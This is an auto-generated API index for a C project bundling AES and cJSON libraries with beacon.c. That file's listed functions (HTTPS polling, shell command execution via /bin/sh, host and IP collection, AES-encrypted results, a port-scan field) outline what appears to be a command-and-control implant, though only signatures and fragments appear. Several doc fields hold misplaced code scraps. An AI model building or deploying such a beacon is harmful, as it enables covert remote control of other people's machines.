# API

## aes.c

### getSBoxValue (function) `static uint8_t getSBoxValue(uint8_t num)`
- Defined: `aes.c:12`
- Doc: define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16
- Depends on: `aes.h`

### getSBoxInvert (function) `static uint8_t getSBoxInvert(uint8_t num)`
- Defined: `aes.c:34`
- Depends on: `aes.h`

### Td0 (function) `static uint8_t Td0(int x)`
- Defined: `aes.c:56`
- Depends on: `aes.h`

### Td1 (function) `static uint8_t Td1(int x)`
- Defined: `aes.c:58`
- Depends on: `aes.h`

### Td2 (function) `static uint8_t Td2(int x)`
- Defined: `aes.c:59`
- Depends on: `aes.h`

### Td3 (function) `static uint8_t Td3(int x)`
- Defined: `aes.c:60`
- Depends on: `aes.h`

### Td4 (function) `static uint8_t Td4(int x)`
- Defined: `aes.c:61`
- Depends on: `aes.h`

### KeyExpansion (function) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)`
- Defined: `aes.c:166`
- Doc: This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.
- Depends on: `aes.h`

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- Defined: `aes.c:238`
- Depends on: `aes.h`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)`
- Defined: `aes.c:244`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Depends on: `aes.h`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- Defined: `aes.c:249`
- Depends on: `aes.h`

### AddRoundKey (function) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:257`
- Doc: This function adds the round key to state. The round key is added to the state by an XOR function.
- Depends on: `aes.h`

### SubBytes (function) `static void SubBytes(state_t* state)`
- Defined: `aes.c:271`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### ShiftRows (function) `static void ShiftRows(state_t* state)`
- Defined: `aes.c:286`
- Doc: The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = R
- Depends on: `aes.h`

### xtime (function) `static uint8_t xtime(uint8_t x)`
- Defined: `aes.c:313`
- Depends on: `aes.h`

### MixColumns (function) `static void MixColumns(state_t* state)`
- Defined: `aes.c:320`
- Doc: MixColumns function mixes the columns of the state matrix
- Depends on: `aes.h`

### Multiply (function) `static uint8_t Multiply(uint8_t x, uint8_t y)`
- Defined: `aes.c:340`
- Doc: Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up 
- Depends on: `aes.h`

### InvMixColumns (function) `static void InvMixColumns(state_t* state)`
- Defined: `aes.c:370`
- Doc: MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand fo
- Depends on: `aes.h`

### InvSubBytes (function) `static void InvSubBytes(state_t* state)`
- Defined: `aes.c:391`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### InvShiftRows (function) `static void InvShiftRows(state_t* state)`
- Defined: `aes.c:402`
- Depends on: `aes.h`

### Cipher (function) `static void Cipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:433`
- Doc: Cipher is the main function that encrypts the PlainText.
- Depends on: `aes.h`

### InvCipher (function) `static void InvCipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:459`
- Doc: if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
- Depends on: `aes.h`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:488`
- Doc: AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) &&
- Depends on: `aes.h`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:495`
- Depends on: `aes.h`

### XorWithIv (function) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)`
- Defined: `aes.c:510`
- Doc: if defined(CBC) && (CBC == 1)
- Depends on: `aes.h`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:520`
- Depends on: `aes.h`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:535`
- Depends on: `aes.h`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:558`
- Doc: XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC)
- Depends on: `aes.h`

### memcpy (function) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`
- Defined: `aes.c:247`
- Depends on: `aes.h`

## aes.h

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- Defined: `aes.h:37`
- Imported by: `aes.c`, `beacon.c`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);`
- Defined: `aes.h:40`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Imported by: `aes.c`, `beacon.c`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- Defined: `aes.h:41`
- Imported by: `aes.c`, `beacon.c`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:45`
- Doc: if defined(ECB) && (ECB == 1)
- Imported by: `aes.c`, `beacon.c`

## beacon.c

### base64_encode (function) `char* base64_encode(const unsigned char* data, size_t input_length)`
- Defined: `beacon.c:49`
- Depends on: `aes.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* data, size_t* out_len)`
- Defined: `beacon.c:75`
- Depends on: `aes.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon.c:118`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon.c:145`
- Depends on: `aes.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon.c:181`
- Depends on: `aes.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon.c:193`
- Depends on: `aes.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon.c:252`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon.c:297`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `beacon.c:340`
- Doc: === MAIN ===
- Depends on: `aes.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacon.c:121`
- Depends on: `aes.h`, `cJSON.h`

### memcpy (function) `memcpy(iv_buf, iv, 16);`
- Defined: `beacon.c:124`
- Depends on: `aes.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacon.c:129`
- Depends on: `aes.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacon.c:138`
- Depends on: `aes.h`, `cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `beacon.c:201`
- Depends on: `aes.h`, `cJSON.h`

### curl_slist_free_all (function) `curl_slist_free_all(headers);`
- Defined: `beacon.c:223`
- Depends on: `aes.h`, `cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `beacon.c:227`
- Depends on: `aes.h`, `cJSON.h`

### fprintf (function) `fprintf(stderr, "[ARM DEBUG] curl_easy_perform returned: %d (%s)\n", res, curl_easy_strerror(res));`
- Defined: `beacon.c:229`
- Depends on: `aes.h`, `cJSON.h`

### fflush (function) `fflush(stderr);`
- Defined: `beacon.c:231`
- Depends on: `aes.h`, `cJSON.h`

### free (function) `free(chunk.memory);`
- Defined: `beacon.c:236`
- Depends on: `aes.h`, `cJSON.h`

### close (function) `close(pipefd[0]);`
- Defined: `beacon.c:258`
- Depends on: `aes.h`, `cJSON.h`

### dup2 (function) `dup2(pipefd[1], 1);`
- Defined: `beacon.c:266`
- Depends on: `aes.h`, `cJSON.h`

### execv (function) `execv("/bin/sh", args);`
- Defined: `beacon.c:269`
- Depends on: `aes.h`, `cJSON.h`

### exit (function) `exit(1);`
- Defined: `beacon.c:270`
- Depends on: `aes.h`, `cJSON.h`

### waitpid (function) `waitpid(pid, NULL, 0);`
- Defined: `beacon.c:277`
- Depends on: `aes.h`, `cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `beacon.c:307`
- Depends on: `aes.h`, `cJSON.h`

### snprintf (function) `snprintf(result + len, 1024 - len, ", ");`
- Defined: `beacon.c:325`
- Depends on: `aes.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacon.c:333`
- Depends on: `aes.h`, `cJSON.h`

### printf (function) `printf("[*] Beacon starting...\n");`
- Defined: `beacon.c:341`
- Depends on: `aes.h`, `cJSON.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacon.c:342`
- Depends on: `aes.h`, `cJSON.h`

### sscanf (function) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- Defined: `beacon.c:346`
- Depends on: `aes.h`, `cJSON.h`

### sleep (function) `sleep(6);`
- Defined: `beacon.c:363`
- Depends on: `aes.h`, `cJSON.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacon.c:415`
- Depends on: `aes.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacon.c:423`
- Depends on: `aes.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacon.c:426`
- Depends on: `aes.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacon.c:431`
- Depends on: `aes.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacon.c:435`
- Depends on: `aes.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacon.c:451`
- Depends on: `aes.h`, `cJSON.h`

## cJSON.c

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- Defined: `cJSON.c:94`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- Defined: `cJSON.c:99`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- Defined: `cJSON.c:109`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char*) cJSON_Version(void)`
- Defined: `cJSON.c:124`
- Doc: CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; 
- Depends on: `cJSON.h`

### case_insensitive_strcmp (function) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)`
- Defined: `cJSON.c:134`
- Doc: /* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1)
- Depends on: `cJSON.h`

### internal_malloc (function) `static void * CJSON_CDECL internal_malloc(size_t size)`
- Defined: `cJSON.c:166`
- Doc: } return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t s
- Depends on: `cJSON.h`

### internal_free (function) `static void CJSON_CDECL internal_free(void *pointer)`
- Defined: `cJSON.c:170`
- Depends on: `cJSON.h`

### internal_realloc (function) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- Defined: `cJSON.c:174`
- Depends on: `cJSON.h`

### cJSON_strdup (function) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- Defined: `cJSON.c:188`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- Defined: `cJSON.c:209`
- Depends on: `cJSON.h`

### cJSON_New_Item (function) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)`
- Defined: `cJSON.c:242`
- Doc: if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc ar
- Depends on: `cJSON.h`

### get_decimal_point (function) `static unsigned char get_decimal_point(void)`
- Defined: `cJSON.c:281`
- Doc: item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate
- Depends on: `cJSON.h`

### parse_number (function) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:309`
- Doc: size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks
- Depends on: `cJSON.h`

### ensure (function) `static unsigned char* ensure(printbuffer * const p, size_t needed)`
- Defined: `cJSON.c:494`
- Doc: } typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for form
- Depends on: `cJSON.h`

### update_offset (function) `static void update_offset(printbuffer * const buffer)`
- Defined: `cJSON.c:579`
- Doc: p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->lengt
- Depends on: `cJSON.h`

### compare_double (function) `static cJSON_bool compare_double(double a, double b)`
- Defined: `cJSON.c:592`
- Doc: /* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer *
- Depends on: `cJSON.h`

### print_number (function) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:599`
- Doc: } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely
- Depends on: `cJSON.h`

### parse_hex4 (function) `static unsigned parse_hex4(const unsigned char * const input)`
- Defined: `cJSON.c:669`
- Doc: output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->of
- Depends on: `cJSON.h`

### utf16_literal_to_utf8 (function) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...`
- Defined: `cJSON.c:706`
- Doc: converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX
- Depends on: `cJSON.h`

### parse_string (function) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:827`
- Doc: else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length
- Depends on: `cJSON.h`

### print_string_ptr (function) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...`
- Defined: `cJSON.c:957`
- Doc: { input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(
- Depends on: `cJSON.h`

### print_string (function) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)`
- Defined: `cJSON.c:1079`
- Doc: /* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; b
- Depends on: `cJSON.h`

### buffer_skip_whitespace (function) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)`
- Defined: `cJSON.c:1093`
- Doc: static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char
- Depends on: `cJSON.h`

### skip_utf8_bom (function) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)`
- Defined: `cJSON.c:1119`
- Doc: while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset =
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- Defined: `cJSON.c:1133`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- Defined: `cJSON.c:1235`
- Depends on: `cJSON.h`

### print (function) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...`
- Defined: `cJSON.c:1242`
- Doc: define cjson_min(a, b) (((a) < (b)) ? (a) : (b))
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- Defined: `cJSON.c:1315`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- Defined: `cJSON.c:1320`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- Defined: `cJSON.c:1351`
- Depends on: `cJSON.h`

### parse_value (function) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1372`
- Doc: return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format =
- Depends on: `cJSON.h`

### print_value (function) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1427`
- Doc: if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input
- Depends on: `cJSON.h`

### parse_array (function) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1501`
- Doc: return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: 
- Depends on: `cJSON.h`

### print_array (function) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1599`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array 
- Depends on: `cJSON.h`

### parse_object (function) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1661`
- Doc: output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_
- Depends on: `cJSON.h`

### print_object (function) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1780`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object
- Depends on: `cJSON.h`

### get_array_item (function) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- Defined: `cJSON.c:1915`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- Defined: `cJSON.c:1934`
- Depends on: `cJSON.h`

### get_object_item (function) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- Defined: `cJSON.c:1944`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- Defined: `cJSON.c:1976`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- Defined: `cJSON.c:1981`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- Defined: `cJSON.c:1986`
- Depends on: `cJSON.h`

### suffix_object (function) `static void suffix_object(cJSON *prev, cJSON *item)`
- Defined: `cJSON.c:1993`
- Doc: return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * co
- Depends on: `cJSON.h`

### create_reference (function) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)`
- Defined: `cJSON.c:2000`
- Doc: CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(objec
- Depends on: `cJSON.h`

### add_item_to_array (function) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2020`
- Depends on: `cJSON.h`

### cast_away_const (function) `static void* cast_away_const(const void* string)`
- Defined: `cJSON.c:2066`
- Doc: /* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_
- Depends on: `cJSON.h`

### add_item_to_object (function) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...`
- Defined: `cJSON.c:2073`
- Doc: if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma G
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- Defined: `cJSON.c:2111`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2122`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- Defined: `cJSON.c:2132`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2142`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2154`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2166`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- Defined: `cJSON.c:2178`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2190`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2202`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- Defined: `cJSON.c:2214`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2226`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2238`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- Defined: `cJSON.c:2250`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2286`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2296`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2301`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2308`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2315`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2320`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- Defined: `cJSON.c:2362`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- Defined: `cJSON.c:2412`
- Depends on: `cJSON.h`

### replace_item_in_object (function) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- Defined: `cJSON.c:2422`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- Defined: `cJSON.c:2445`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- Defined: `cJSON.c:2450`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- Defined: `cJSON.c:2467`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- Defined: `cJSON.c:2478`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- Defined: `cJSON.c:2489`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- Defined: `cJSON.c:2500`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- Defined: `cJSON.c:2525`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- Defined: `cJSON.c:2542`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- Defined: `cJSON.c:2554`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- Defined: `cJSON.c:2566`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- Defined: `cJSON.c:2578`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- Defined: `cJSON.c:2595`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- Defined: `cJSON.c:2606`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- Defined: `cJSON.c:2658`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- Defined: `cJSON.c:2698`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- Defined: `cJSON.c:2738`
- Depends on: `cJSON.h`

### cJSON_Duplicate_rec (function) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- Defined: `cJSON.c:2785`
- Depends on: `cJSON.h`

### skip_oneline_comment (function) `static void skip_oneline_comment(char **input)`
- Defined: `cJSON.c:2872`
- Depends on: `cJSON.h`

### skip_multiline_comment (function) `static void skip_multiline_comment(char **input)`
- Defined: `cJSON.c:2885`
- Depends on: `cJSON.h`

### minify_string (function) `static void minify_string(char **input, char **output)`
- Defined: `cJSON.c:2899`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- Defined: `cJSON.c:2921`
- Depends on: `cJSON.h`

